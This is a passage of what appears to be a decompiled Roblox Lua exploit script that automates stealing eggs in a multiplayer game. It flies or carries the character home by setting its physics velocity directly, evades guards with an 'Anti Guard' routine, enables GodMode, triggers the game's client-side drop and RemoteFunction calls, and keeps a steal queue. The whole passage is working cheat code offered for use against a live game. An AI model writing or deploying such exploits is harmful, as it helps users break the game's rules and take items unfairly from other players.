				local value102 = str1.Root()

				if value102 then
					pcall(function()
						value102.AssemblyLinearVelocity = Vector3.new(0, value102.AssemblyLinearVelocity.Y, 0)
					end)
				end

				local n27 = 0

				while n27 < 2 and safeCarry.LastDelivered < now and steal.Carrying and not func61(param84) do
					n27 += RunService.Heartbeat:Wait()
				end

				func123()
				return safeCarry.LastDelivered >= now
			end

			str1.SafeCarry.Home = function(param86)
				local safeCarry = str1.SafeCarry
				local result24 = stealHome()
				local flag138 = str1.Root()
				if not result24 or not flag138 then
					return false
				end
				func74()
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				local areas = world and world:FindFirstChild("Areas")
				local separationLine = areas and areas:FindFirstChild("SeparationLine")
				local n21 = (separationLine and separationLine:IsA("BasePart") and separationLine.Position.X or 552) - 7
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")

				if humanoid then
					humanoid.PlatformStand = false
				end

				local now = os.clock()
				local n22 = 0

				local function func130()
					local flag139 = str1.Root()
					if not flag139 then
						return
					end
					local num54, flag140, num55, num56, num57 = safeCarry.Plan(str1.Steal.CarryAreaId, (Vector3.new(flag139.Position.X, 0, flag139.Position.Z) - Vector3.new(result24.X, 0, result24.Z)).Magnitude + math.max(0, safeCarry.Height) * 2, safeCarry.Mult)
					local n23 = num54 * safeCarry.CarryScale
					n22 = n23
					safeCarry.PlanOk = flag140
					safeCarry.FloorSpeed = safeCarry.BeatGuard and math.min(num57 + math.max(safeCarry.GuardMargin, 1), num56) or 0
					flag50 = string.format("Carrying home at %d (carry %d, guard %d, max %d)%s", math.floor(n23 + 0.5), math.floor(num55 + 0.5), math.floor(num57 + 0.5), math.floor(num56 + 0.5), flag140 and "" or ", guard is faster, going at your max safe speed")
				end

				local function func131()
					local n23 = math.max(0, safeCarry.Height)
					local flag141 = str1.Root()
					local character2 = localPlayer.Character
					if n23 <= 0.5 or not flag141 or not character2 then
						return
					end
					local n24 = result24.Y + n23
					if n24 - 2 <= flag141.Position.Y then
						return
					end
					local rotation = flag141.CFrame.Rotation
					local n25 = CFrame.new(Vector3.new(flag141.Position.X, n24, flag141.Position.Z)) * rotation

					pcall(function()
						character2:PivotTo(n25)
						flag141.AssemblyLinearVelocity = Vector3.zero
						flag141.AssemblyAngularVelocity = Vector3.zero
					end)
				end

				func130()
				local num58 = safeCarry.NewHuman(true)
				local flag142 = str1.Root()
				local n23 = math.clamp((flag142 and flag142.Position.Z or result24.Z) + num58.Lane, -425, -300)
				local now2 = os.clock()

				if safeCarry.CarryReact > 0 then
					local n24 = os.clock() + safeCarry.React(0, safeCarry.CarryReact)

					while os.clock() < n24 and not func61(param86) do
						RunService.Heartbeat:Wait()
					end
				end

				local n24 = 0

				if safeCarry.CarryStyle ~= "Walk" then
					func131()
				end

				while not func61(param86) do
					local num59 = str1.Root()
					if not num59 then
						return false
					end

					if not str1.Steal.Carrying then
						if now <= safeCarry.LastDelivered then
							return true
						end
						task.wait(0.1)
						if now <= safeCarry.LastDelivered then
							return true
						end

						if now <= safeCarry.LastFailed then
							flag50 = "Delivery was rewound, too fast for your speed"
							return false
						end

						if not safeCarry.PlanOk and str1.Steal.CarryUid then
							safeCarry.Blocked[str1.Steal.CarryUid] = true
							flag50 = string.format("The guard caught you with %s, it is faster than your max safe speed, skipping this egg", tostring(safeCarry.Category))
							return false
						end

						n24 += 1
						if safeCarry.RecoverTries < n24 then
							flag50 = "The egg is gone"
							return false
						end
						flag50 = "Egg dropped, taking it back"
						if not func111(param86) then
							flag50 = "Could not take the egg back"
							return false
						end
						local n25 = 0

						while func90() and n25 < 4 and not func61(param86) do
							n25 += RunService.Heartbeat:Wait()
						end

						local n26 = math.min(now, os.clock())
						func130()

						if safeCarry.CarryStyle ~= "Walk" then
							func131()
						end

						num59 = str1.Root()
						if not num59 then
							return false
						end
						now = n26
					end

					local now3 = os.clock()
					local n25 = math.max(now3 - now2, 0.0041666666666666666)
					local carryStyle = safeCarry.CarryStyle == "Walk"
					local n26 = carryStyle and 0 or math.max(0, safeCarry.Height)
					local num60, num61 = num58.Step(n25, n26 <= 0.5 and humanoid or nil, humanoid and humanoid.FloorMaterial ~= Enum.Material.Air)
					local n27 = math.clamp(n23 + num61, -425, -300)
					local vector = num59.Position.X > n21 + 2 and Vector3.new(n21, num59.Position.Y, n27) or result24
					local flag143, flag144 = safeCarry.Avoid(num59.Position, vector)

					if not flag144 then
						flag143 = vector
					end

					local vector2 = Vector3.new(flag143.X - num59.Position.X, 0, flag143.Z - num59.Position.Z)
					if vector2.Magnitude < 2 and flag143 == result24 then
						break
					end
					local n28 = math.max(n22 * num60, safeCarry.FloorSpeed or 0)

					if os.clock() < (safeCarry.SlowUntil or 0) then
						n28 *= safeCarry.SlowFactor
					end

					if carryStyle then
						pcall(function()
							if humanoid and vector2.Magnitude > 0.01 then
								humanoid:MoveTo(num59.Position + vector2.Unit * math.min(vector2.Magnitude, 30))
							end
						end)
					elseif n26 > 0.5 then
						local n29 = math.clamp(safeCarry.ClimbShare, 0.1, 0.9)
						local y = result24.Y
						local n30 = math.max(0, num59.Position.X - n21)
						local n31 = n26 * math.sqrt(1 - n29 * n29) / n29
						local n32 = y + n26

						if flag143 == result24 or n30 <= n31 then
							n32 = y + n26 * math.clamp((flag143 == result24 and 0 or n30) / math.max(n31, 1), 0, 1)
						end

						local n33 = math.clamp((n32 - num59.Position.Y) / 0.12, -n28 * n29, n28 * n29)
						local num62 = math.sqrt(math.max(n28 * n28 - n33 * n33, 0))
						local vector3 = vector2.Magnitude > 0.01 and vector2.Unit * math.min(num62, vector2.Magnitude / 0.05) or Vector3.zero

						pcall(function()
							num59.AssemblyLinearVelocity = Vector3.new(vector3.X, n33, vector3.Z)
						end)
					else
						local vector3 = vector2.Magnitude > 0.01 and vector2.Unit * math.min(n28, vector2.Magnitude / 0.05) or Vector3.zero

						pcall(function()
							num59.AssemblyLinearVelocity = Vector3.new(vector3.X, num59.AssemblyLinearVelocity.Y, vector3.Z)

							if safeCarry.RunAnimate and humanoid and vector2.Magnitude > 0.01 then
								humanoid:Move(vector2.Unit, false)
							end
						end)
					end

					RunService.Heartbeat:Wait()
					now2 = now3
				end

				if humanoid then
					pcall(function()
						local value103 = str1.Root()

						if safeCarry.CarryStyle == "Walk" and value103 then
							humanoid:MoveTo(value103.Position)
						end

						humanoid:Move(Vector3.zero, false)
					end)
				end

				local n25 = 0

				while n25 < 2 and not func61(param86) do
					if safeCarry.LastDelivered >= now then
						return true
					end

					if now <= safeCarry.LastFailed then
						flag50 = "Delivery was rewound, too fast for your speed"
						return false
					end

					if not str1.Steal.Carrying then
						break
					end
					n25 += RunService.Heartbeat:Wait()
				end

				if str1.Steal.Carrying then
					task.wait(0.2)
					local eggState = tbl1.EggState

					if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
						pcall(eggState.DropFieldEgg, "PlayerRequest")
					end
				end

				return safeCarry.LastDelivered >= now
			end

			local function func132(param87)
				local antiGuard = str1.AntiGuard

				if antiGuard.Enabled and not str1.SafeCarry.LineDrop and not str1.BossPortalUp() then
					local n21 = 0

					while not antiGuard.Busy and n21 < 1 and not func61(param87) do
						flag50 = "Waiting for Anti Guard to start"
						n21 += RunService.Heartbeat:Wait()
					end

					local busy = antiGuard.Busy
					local n22 = 0

					while antiGuard.Busy and n22 < 30 and not func61(param87) do
						flag50 = "Anti Guard is slipping past the guard"
						n22 += RunService.Heartbeat:Wait()
					end

					if busy then
						local n23 = 0
						local n24 = 0

						while true do
							if n23 < 10 and not func61(param87) then
								local result25 = func90()
								local ok, result = pcall(str1.Steal.HeldByMe)
								ok = ok and result == true
								local flag145 = not result25

								if not (flag145 and not ok) then
									if flag145 and ok and not antiGuard.Busy then
										n24 += RunService.Heartbeat:Wait()
										if not (n24 >= 0.3) then
											continue
										end
									else
										flag50 = result25 and "The guard hit you, waiting until you can move" or "Waiting for Anti Guard to finish"
										n23 += RunService.Heartbeat:Wait()
										n24 = 0
										continue
									end
								end
							end

							break
						end

						local ok, result = pcall(str1.Steal.HeldByMe)

						if ok and not result then
							str1.Steal.Carrying = false
						end

						local safeCarry = str1.SafeCarry
						local result26 = stealHome()
						local n25 = result26 and safeCarry.Enabled and safeCarry.CarryStyle ~= "Walk" and safeCarry.Height > 0.5 and result26.Y + safeCarry.Height or nil
						local n26 = 0

						while n26 < 0.8 and str1.Steal.Carrying and not func61(param87) do
							flag50 = n26 < 0.6 and "Anti Guard done, rising up" or "Anti Guard done, getting ready"
							local num63 = str1.Root()

							if num63 and n25 then
								local n27 = n25 - num63.Position.Y
								local n28 = n26 < 0.6 and math.clamp(n27 / math.max(0.6 - n26, 0.1), -120, 120) or math.clamp(n27 / 0.2, -30, 30)

								pcall(function()
									num63.AssemblyLinearVelocity = Vector3.new(0, n28, 0)
								end)
							end

							n26 += RunService.Heartbeat:Wait()
						end

						local ok2, result2 = pcall(str1.Steal.HeldByMe)

						if ok2 and not result2 then
							str1.Steal.Carrying = false
						else
							str1.SafeCarry.SlowUntil = os.clock() + 2
						end
					end
				end

				local n21 = 0

				while not str1.Steal.Carrying and n21 < n14 and not func61(param87) do
					flag50 = "Checking the egg in hand"
					n21 += RunService.Heartbeat:Wait()
				end

				if not str1.Steal.Carrying then
					flag50 = "The egg is gone, staying to look for it"
					if not func111(param87) then
						flag50 = "The egg is gone"
						return false
					end
				end

				if str1.SafeCarry.LineDrop then
					return str1.SafeCarry.LineDropHome(param87)
				end

				if str1.SafeCarry.Enabled then
					return str1.SafeCarry.Home(param87)
				end
				local result27 = stealHome()
				local flag146 = str1.Root()
				if not result27 or not flag146 then
					return false
				end
				local n22 = math.max(flag146.Position.Y, result27.Y) + n7

				local function func133()
					if tbl91.Uid and tbl91.Freed and str1.Steal.Carrying then
						return "priority"
					end
					return nil
				end

				local flag147 = true
				local n23 = 0

				while true do
					local flag148 = str1.Root()

					if not flag148 then
						return false
					else
						flag50 = "Flying home"
						local position = flag148.Position
						local n24 = math.max(n22, position.Y)
						local value104, flag149 = func94(Vector3.new(position.X + (result27.X - position.X) * 0.25, position.Y + (n24 - position.Y) * 0.7, position.Z + (result27.Z - position.Z) * 0.25), param87, flag147, nil, nil, func133)

						if value104 then
							value104, flag149 = func94(Vector3.new(result27.X, n24, result27.Z), param87, flag147, nil, nil, func133)
						end

						if value104 then
							value104, flag149 = func94(result27, param87, flag147, nil, nil, func133)
						end

						if value104 then
							local character = localPlayer.Character
							character = character and character:FindFirstChildOfClass("Humanoid")

							if character then
								character.PlatformStand = false
							end

							task.wait(0.2)
							if not str1.Steal.Carrying then
								flag50 = "Arrived without the egg"
								return false
							end
							local eggState = tbl1.EggState

							if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
								pcall(eggState.DropFieldEgg, "PlayerRequest")
							end

							return true
						end

						if flag149 == "priority" then
							local uid2 = tbl91.Uid
							local freed = tbl91.Freed
							local value105 = tbl91
							tbl91.Uid = nil
							value105.Freed = nil
							local num64 = str1.Root()
							if not num64 or not uid2 or not freed then
								return false
							end

							if (freed - num64.Position).Magnitude <= n8 * n20 then
								flag50 = "Best egg fell nearby, swapping eggs"
								local eggState = tbl1.EggState

								if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
									pcall(eggState.DropFieldEgg, "PlayerRequest")
								end

								local n25 = 0

								while str1.Steal.Carrying and n25 < 1 do
									n25 += RunService.Heartbeat:Wait()
								end

								if not func111(param87, uid2) then
									return false
								end
							else
								flag50 = "Best egg fell far away, riding a guard hit to it"
								if not func114(param87, uid2, freed) then
									return false
								end
							end

							local value106 = str1.Root()
							n23 = 0

							if value106 then
								n22 = math.max(value106.Position.Y, result27.Y) + n7
							end

							continue
						end

						if flag149 == "dropped" and n23 < huge then
							n23 += 1
							if not func111(param87) then
								return false
							end
							continue
						end

						break
					end
				end

				return false
			end

			local function func134(param88)
				local n21 = tonumber(param88) or 0
				local tbl94 = { "", "K", "M", "B", "T", "Qa", "Qi" }
				local n22 = 1

				while math.abs(n21) >= 1000 and n22 < #tbl94 do
					n21 /= 1000
					n22 += 1
				end

				return string.format(n22 == 1 and "%.0f%s" or "%.2f%s", n21, tbl94[n22])
			end

			local function func135(flag150)
				if not flag150 then
					return "None"
				end
				local format = string.format
				local category2 = tostring(flag150.Category)
				local n21 = tonumber(flag150.Scale) or 0
				local func136 = tostring
				local areaId = flag150.AreaId
				local value107 = format("%s  %.2fx  |  value %s  |  %s", category2, n21, func134(flag150.Value), func136(areaId))

				if flag150.State == "Dropped" then
					value107 ..= "  |  dropped"
				elseif flag150.State == "Carried" then
					value107 ..= "  |  carried by a player"
				end

				return value107
			end

			local flag151 = false
			local n21 = 0.5
			local n22 = 0.6
			local n23 = 0
			local n24 = 0

			local function func137()
				local flag152 = n9
				str1.Steal.Active = true
				str1.Steal.Carrying = str1.Steal.Carrying == true

				if not str1.Steal.Carrying then
					str1.Steal.CarryUid = nil
				end

				local value108 = func68(false, true)
				local value109 = nil
				local value110 = nil
				local lastSkip = nil

				for _, item40 in ipairs(value108) do
					if item40.State == "Carried" then
						value110 = value110 or item40
					elseif not str1.StockWaits(item40) then
						local value111 = str1.SafeCarry.Unsafe(item40)

						if value111 then
							lastSkip = lastSkip or value111
						else
							value109 = item40
							break
						end
					end
				end

				local tbl95 = { value109 }
				uid = value109 and value109.Uid or nil
				str1.Steal.Wanted = value109 ~= nil
				str6 = func135(value109)

				if value110 then
					str6 ..= "  |  watching " .. tostring(value110.Category)
				end

				if not value109 then
					str1.Steal.Active = false
					lastSkip = lastSkip or str1.SafeCarry.LastSkip
					str1.SafeCarry.LastSkip = nil
					flag50 = value110 and "Best egg is carried, waiting for it" or lastSkip and "Skipped: " .. lastSkip or "No egg matches"
					return false
				end

				if not str1.ClaimMovement("steal") then
					str1.Steal.Active = false
					flag50 = str1.InMechArena() and "In the Mech arena, waiting to be back home" or "Waiting for Auto Place"
					return false
				end

				if str1.InMechArena() then
					flag50 = "Leaving the Mech arena first"

					if not (type(str1.MechLeave) == "function" and str1.MechLeave() or false) or flag152 ~= n9 then
						str1.Steal.Active = false
						flag50 = "Stuck in the Mech arena, waiting"
						return false
					end
				end

				if str1.Treadmill.Riding or str1.OnBelt() then
					str1.ExitBelt()
				end

				flag151 = true
				str1.HoldBelt()

				local function func138(param89)
					flag50 = param89
					local flag153 = func112(value109, flag152)
					local value112 = nil
					local flag154 = false

					if flag153 then
						if func84(value109.Uid, flag152) then
							flag154 = func132(flag152)
							value112 = nil
						else
							value112 = flag50
						end
					end

					func78()
					str1.Steal.Active = false
					str1.Steal.LastFinishedAt = os.clock()
					flag50 = flag154 and "Delivered" or value112 or flag153 and "Run ended" or "That egg would not come free"
					return true
				end

				local num65 = str1.Root()
				local position = typeof(value109.CFrame) == "CFrame" and value109.CFrame.Position or nil

				if num65 and position then
					local num66 = (position - num65.Position).Magnitude <= n17
					local areaId = value109.AreaId
					local flag155 = localPlayer:GetAttribute("AreaId") == areaId
					if num66 or flag155 then
						return (func138("Target is right here, taking it"))
					end
				end

				if str1.SafeCarry.Enabled and str1.SafeCarry.Approach == "Run" then
					local flag156 = str1.SafeCarry.RunTo(value109, flag152)
					local flag157, flag158

					if flag156 then
						if func84(value109.Uid, flag152) then
							flag157 = func132(flag152)
							flag158 = nil
						else
							flag158 = flag50
							flag157 = false
						end
					else
						tbl80[value109.Uid] = os.clock() + n10
						flag158 = nil
						flag157 = false
					end

					func78()
					str1.Steal.Active = false
					str1.Steal.LastFinishedAt = os.clock()
					flag50 = flag157 and "Delivered" or flag158 or flag156 and "Run ended" or "That egg would not come free"
					return true
				end

				local value113 = func68(true)
				local str10 = "FirstAreaEgg_" .. tostring(localPlayer.UserId)
				local tbl96 = {}

				for _, item41 in ipairs(value113) do
					if func95(item41) or type(item41.Uid) == "string" and string.sub(item41.Uid, 1, #str10) == str10 then
						table.insert(tbl96, item41)
					end
				end

				if #tbl96 ~= 0 then
					value113 = tbl96
				end

				local flag159, num67 = func92(value113)

				if not flag159 then
					str1.Steal.Active = false
					flag50 = "No egg matches"
					return false
				end

				if flag159.Uid == value109.Uid then
					return (func138("Target is the closest egg, taking it"))
				end
				local value114, num68 = func96(flag159)
				local flag160

				if num68 and num65 then
					local value115, value116, value117 = ipairs(value113)
					local huge3 = math.huge
					flag160 = flag159

					for _, value118 in value115, value116, value117 do
						local position2 = typeof(value118.CFrame) == "CFrame" and value118.CFrame.Position or nil

						if value118.Uid ~= value109.Uid and value118.AreaId == flag159.AreaId and position2 then
							local magnitude = (position2 - num65.Position).Magnitude
							local n25

							if (position2 - num68).Magnitude > n16 then
								n25 = magnitude + n16
							else
								n25 = magnitude
							end

							if n25 < huge3 then
								huge3 = n25
								flag160 = value118
							end
						end
					end
				else
					flag160 = flag159
				end

				flag50 = string.format("Sleeping guard egg %d studs away", math.floor(num67 + 0.5))

				if not flag160 then
					str1.Steal.Active = false
					flag50 = "No egg matches"
					return false
				end

				local flag161, flag162 = func106(flag160, flag152, false, tbl95[1])
				if not flag161 then
					str1.Steal.Active = false
					return false
				end
				local uid2 = nil
				local uid3 = value109.Uid
				local n25 = 0
				local value119

				while true do
					if flag162 and not func61(flag152) then
						flag50 = "Holding for the guard hit"

						if not func97(flag152, flag162, function(param90)
							if not uid2 and tbl91.Uid and tbl91.Freed then
								uid2 = tbl91.Uid
								param90.Destination = tbl91.Freed + Vector3.new(0, 3, 0)
								local value120 = tbl91
								tbl91.Uid = nil
								value120.Freed = nil
								flag50 = "Best egg fell, jumping to it instead"
							end
						end) then
							value119 = uid3
							break
						end

						n25 += 1

						if uid2 then
							func111(flag152, uid2)
							value119 = uid2
							break
						end

						local entry4 = tbl95[n25]
						flag161, flag162 = func106(entry4, flag152, true, tbl95[n25 + 1])
						if not flag161 then
							value119 = uid3
							break
						end

						if entry4 and type(entry4.Uid) == "string" then
							uid3 = entry4.Uid
						end

						continue
					end

					value119 = uid3
					break
				end

				if not func84(value119, flag152) then
					local value121 = flag50
					func78()
					str1.Steal.Active = false
					str1.Steal.LastFinishedAt = os.clock()
					flag50 = value121
					return true
				end

				local flag163 = func132(flag152)
				func78()
				str1.Steal.Active = false
				str1.Steal.LastFinishedAt = os.clock()
				flag50 = flag163 and "Delivered" or "Run ended"
				return true
			end

			local eggState = tbl1.EggState

			if type(eggState) == "table" then
				for _, item42 in ipairs({ "FieldRefreshed", "FieldShifted", "FieldGone", "SnapshotRefreshed" }) do
					local entry5 = eggState[item42]

					if type(entry5) == "table" and type(entry5.Connect) == "function" then
						local ok, result = pcall(entry5.Connect, entry5, function()
							tbl2.Wake()
						end)

						if ok and result then
							func4(function()
								pcall(function()
									result:Disconnect()
								end)
							end)
						end
					end
				end
			end

			tbl2.Add(function()
				local flag164

				if value56 then
					flag164 = type(value56.Set) == "function"
				end

				if flag164 then
					pcall(value56.Set, nil, flag50)
				end

				local value122 = nil

				if value57 then
					value122 = type(value57.Set) == "function"
				end

				if value122 then
					pcall(value57.Set, nil, str6)
				end

				if not str1.Toggle(flag49, false) then
					return false
				end
				local num69, flag165, num70 = func62()

				if num69 then
					if flag165 == "night" then
						func65()
					end

					str1.Movement.StealFirst = true
					str1.Steal.Wanted = false

					if flag51 then
						n9 += 1
						str1.Steal.Active = false
						func78()
						str1.StopWalking()
					end

					local n25 = math.max(0, math.ceil(num69 - num70))

					if flag165 == "wall" then
						flag50 = string.format("Field wall up, %ds", n25)
					else
						flag50 = string.format("Night, going again in %ds", n25)
					end

					return false
				end

				if tbl82 and n12 == math.huge then
					n12 = os.clock() + n11
				end

				if flag51 then
					return true
				end

				if func66() then
					flag50 = "Night over, waiting for the field to reset"
					tbl2.Wake()
					return false
				end

				if type(str1.MechFirst) == "function" and str1.MechFirst() then
					local flag166 = false

					if n23 <= os.clock() then
						n23 = os.clock() + n21
						local ok, result = pcall(func68, false, false)

						if ok and type(result) == "table" then
							for _, item43 in ipairs(result) do
								if item43.State ~= "Carried" and item43.RiftOnly ~= true and not str1.StockWaits(item43) then
									flag166 = true
									break
								end
							end
						end
					end

					if not flag166 then
						str1.Steal.Wanted = false
						flag50 = "Mech boss goes first, stealing after it"
						return false
					end

					str1.Steal.BossOverride = true
					str1.Steal.Wanted = true
					str1.Movement.StealFirst = true
					flag50 = "Filtered egg found, leaving the boss for it"
					tbl2.Wake()
					return false
				end

				local stealFirst = str1.Movement.StealFirst
				local owner = str1.Movement.Owner
				local placeWanted = str1.Movement.PlaceWanted and not stealFirst
				local flag167

				if placeWanted then
					flag167 = placeWanted
				else
					flag167 = owner ~= nil and owner ~= "steal" and owner ~= "treadmill" and owner ~= "scramble"
				end

				if flag167 then
					if n23 <= os.clock() then
						n23 = os.clock() + n21
						local ok, result = pcall(func68, false, false)
						local wanted = ok and type(result) == "table" and result[1] ~= nil and not str1.StockWaits(result[1])
						str1.Steal.Wanted = wanted

						if wanted then
							str1.Movement.StealFirst = true
						else
							str1.Steal.BossOverride = false
						end
					end

					if str1.Steal.Wanted then
						flag50 = "Egg found, waiting for " .. tostring(owner or "Auto Place") .. " to stop"
					else
						flag50 = "Waiting for " .. tostring(owner or "Auto Place")
					end

					return true
				end

				if os.clock() < n24 then
					return true
				end
				str1.Movement.StealFirst = false
				flag51 = true

				task.spawn(function()
					local ok = pcall(func137)
					str1.Steal.BossOverride = false

					if flag151 then
						flag151 = false
						str1.ReleaseBelt()
					end

					if not ok then
						func78()
						str1.Steal.Active = false
					end

					local flag168 = uid
					uid = nil
					local flag169 = flag168 and tbl40[flag168]

					if flag169 and flag169.Once then
						tbl40[flag168] = nil
					end

					local value123 = tbl91
					local value124 = tbl91
					tbl91.Uid = nil
					value123.Freed = nil
					value124.Token = nil

					if flag50 == "Delivered" and not str1.IsNight() then
						str1.Movement.StealFirst = true
					end

					if not str1.Steal.Wanted then
						n24 = os.clock() + n22
					end

					str1.ReleaseMovement("steal")
					flag51 = false
					tbl2.Wake()
				end)

				return true
			end)
		end

		flag49 = value2

		func46 = function()
			str1.Steal.BossOverride = false
			n9 += 1
			table.clear(tbl80)
			str1.Steal.Active = false
			str1.Steal.Wanted = false
			local flag170 = str1.Toggle(flag49, false)
			str1.Shield("steal", flag170)

			if not flag170 then
				str1.Movement.StealFirst = false
				table.clear(tbl40)
				table.clear(tbl41)
				table.clear(tbl42)
			end

			func78()
			str1.StopWalking()
			tbl2.Wake()
		end

		do
			local function func139()
				n9 += 1
				str1.Steal.Active = false
				func78()
				str1.StopWalking()
			end

			local function func140()
				if str1.Toggle(flag49, false) then
					return true
				end

				if flag49 and type(flag49.Set) == "function" then
					pcall(flag49.Set, flag49, true)
				end

				return false
			end

			str1.CancelSteal = function(param91)
				if type(param91) ~= "string" then
					return
				end
				tbl40[param91] = nil
				tbl41[param91] = nil
				tbl42[param91] = true

				if flag51 and uid == param91 then
					func139()
				end

				tbl2.Wake()
			end

			str1.StealQueue = function()
				local tbl97 = {}

				for k in pairs(tbl40) do
					table.insert(tbl97, k)
				end

				table.sort(tbl97, function(flag171, param92)
					local at = tbl40[flag171].At
					local at2 = tbl40[param92].At
					if at ~= at2 then
						return at < at2
					end
					return flag171 < param92
				end)

				return tbl97
			end

			str1.PrioritizeSteal = function(param93)
				if type(param93) ~= "string" or func64() then
					return
				end
				local n18 = 0

				for _, value125 in pairs(tbl40) do
					if value125.At < n18 then
						n18 = value125.At
					end
				end

				tbl40[param93] = { At = n18 - 1, Once = false }
				tbl42[param93] = nil
				tbl80[param93] = nil

				if func140() and flag51 and not str1.Steal.Carrying and uid ~= param93 then
					func139()
				end

				tbl2.Wake()
			end

			str1.MoveInPlan = function(param94, num71)
				if type(param94) ~= "string" or num71 ~= -1 and num71 ~= 1 or func64() then
					return
				end
				local list15 = str1.StealPlan()
				local foundAt2 = table.find(list15, param94)
				local n18 = foundAt2 and foundAt2 + num71
				if not n18 or n18 < 1 or n18 > #list15 then
					return
				end
				table.remove(list15, foundAt2)
				table.insert(list15, n18, param94)
				local n19 = math.max(foundAt2, n18)

				for i, item44 in ipairs(list15) do
					if i <= n19 or tbl40[item44] then
						local entry6 = tbl40[item44]

						if entry6 then
							entry6.At = i
						else
							tbl40[item44] = { At = i, Once = false }
						end

						tbl42[item44] = nil
					end
				end

				if flag51 and not str1.Steal.Carrying and uid and list15[1] ~= uid then
					func139()
				end

				tbl2.Wake()
			end

			str1.StealPlan = function()
				if not str1.Toggle(flag49, false) or str1.IsNight() then
					return {}, nil
				end
				local tbl98 = {}

				if uid then
					table.insert(tbl98, uid)
				end

				local ok, result = pcall(func68, false, true)

				if ok and type(result) == "table" then
					for _, item45 in ipairs(result) do
						if item45.Uid ~= uid then
							table.insert(tbl98, item45.Uid)
						end
					end
				end

				return tbl98, uid
			end

			str1.SetPriority = function(param95, param96)
				if param96 then
					str1.PrioritizeSteal(param95)
				else
					str1.CancelSteal(param95)
				end
			end

			str1.ResortSteal = function()
				if flag51 and not str1.Steal.Carrying and uid and not tbl40[uid] then
					local ok, result = pcall(func68, false, true)

					if ok and type(result) == "table" then
						local value126 = nil

						for _, item46 in ipairs(result) do
							if item46.State ~= "Carried" then
								value126 = item46
								break
							else
								value126 = nil
							end
						end

						if not value126 or value126.Uid ~= uid then
							func139()
						end
					end
				end

				tbl2.Wake()
			end

			str1.StealNow = function(param97, flag172)
				if type(param97) ~= "string" or func64() then
					return
				end

				if not tbl40[param97] then
					local n18 = 0

					for _, value127 in pairs(tbl40) do
						if n18 < value127.At then
							n18 = value127.At
						end
					end

					tbl40[param97] = { At = n18 + 1, Once = flag172 == true }
				end

				tbl42[param97] = nil
				tbl80[param97] = nil
				local flag173 = func140() and flag51 and not str1.Steal.Carrying and uid ~= param97
				local flag174

				if flag173 then
					flag174 = not (uid and tbl40[uid])
				else
					flag174 = flag173
				end

				if flag174 then
					func139()
				end

				tbl2.Wake()
			end
		end

		func4(function()
			str1.GodMode(false)
			str1.ReleaseMovement("steal")
			func78()
		end)

		str1.UiQueue = {}

		str1.UiDefer = function(param98)
			table.insert(str1.UiQueue, param98)
		end

		str1.Notify = function(param99, param100)
			if type(obj1) == "table" and type(obj1.Notify) == "function" then
				pcall(obj1.Notify, param99, param100, 5)
			end
		end

		local connection = RunService.Heartbeat:Connect(function()
			local uiQueue = str1.UiQueue
			if #uiQueue == 0 then
				return
			end
			str1.UiQueue = {}

			for _, item47 in ipairs(uiQueue) do
				pcall(item47)
			end
		end)

		func4(function()
			pcall(function()
				connection:Disconnect()
			end)
		end)

		str1.Rift = { Requirements = {}, At = 0, Busy = false, Next = 0, Handles = {}, Restart = {} }

		str1.RiftOn = function(param101)
			local flag175 = str1.Rift.Handles[param101]
			return flag175 ~= nil and str1.Toggle(flag175, false) == true
		end

		do
			local n18 = 8

			local function func141(param102)
				local directory = tbl1.Assets and tbl1.Assets.Directory
				local flag176 = type(directory) == "table" and directory[tostring(param102)] or nil
				return type(flag176) == "table" and flag176 or nil
			end

			str1.EggRarity = function(obj)
				local assetCategory4 = func141(obj.AssetCategory)
				local rarity = assetCategory4 and assetCategory4.Rarity or nil
				local flag177 = type(rarity) == "table"

				if flag177 then
					flag177 = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				return flag177 or 0
			end

			str1.EggIncome = function(obj)
				local n19 = func141(obj.AssetCategory)
				n19 = n19 and tonumber(n19.EarningRate) or 0
				local n20 = tonumber(obj.AssetScale) or 0
				if n20 <= 0 then
					return 0
				end
				local n21 = n20 > 5 and (n20 / 5) ^ 1.2 * 19.637875755794113 or n20 ^ 1.85
				local mutations = tbl1.Mutations
				local flag178 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n22 = 1

				if flag178 then
					local ok
					ok, n22 = pcall(mutations.EarningsFor, type(obj.Mutations) == "table" and obj.Mutations or {})
					ok = ok and type(n22) == "number"
					local n23 = 1

					if not ok then
						n22 = n23
					end
				end

				return n19 * n21 * n22
			end

			str1.RiftShortfall = function()
				local tbl99 = {}

				for _, requirement in ipairs(str1.Rift.Requirements) do
					tbl99[requirement] = (tbl99[requirement] or 0) + 1
				end

				if next(tbl99) == nil then
					return tbl99
				end
				local save2 = tbl1.Save
				local flag179 = type(save2) == "table" and type(save2.Get) == "function"
				local result = nil

				if flag179 then
					local ok
					ok, result = pcall(save2.Get)
					result = ok and type(result) == "table" and result or nil
				end

				if not result then
					return {}
				end
				local tbl100 = {}
				local func142 = pairs
				local equippedAssets = result.EquippedAssets or {}

				for _, equippedAsset in func142(equippedAssets) do
					tbl100[equippedAsset] = true
				end

				local func143 = pairs
				local inventory = result.Inventory or {}

				for k, value128 in func143(inventory) do
					local str11 = type(value128) == "table" and tostring(value128.Category) or nil
					local flag180

					if str11 then
						flag180 = (tbl99[str11] or 0) > 0
					else
						flag180 = str11
					end

					if flag180 and value128.InFuse ~= true and value128.IsFavorite ~= true and not tbl100[k] then
						tbl99[str11] = tbl99[str11] - 1
					end
				end

				for k, value129 in pairs(tbl99) do
					if value129 <= 0 then
						tbl99[k] = nil
					end
				end

				return tbl99
			end

			local function func144()
				for k in pairs(str1.Rift.Handles) do
					if str1.RiftOn(k) then
						return true
					end
				end

				return false
			end

			tbl2.Add(function()
				local rift = str1.Rift
				local busy = rift.Busy

				if not busy then
					local next_ = rift.Next
					busy = os.clock() < next_
				end

				if busy or not func144() then
					return false
				end
				rift.Busy = true
				rift.Next = os.clock() + n18

				task.spawn(function()
					local rfScrambleTradeInAskState = networking:FindFirstChild("RF/ScrambleTradeIn/AskState")

					if rfScrambleTradeInAskState and rfScrambleTradeInAskState:IsA("RemoteFunction") then
						local ok, result = pcall(rfScrambleTradeInAskState.InvokeServer, rfScrambleTradeInAskState)

						if ok and type(result) == "table" then
							local requirements = {}

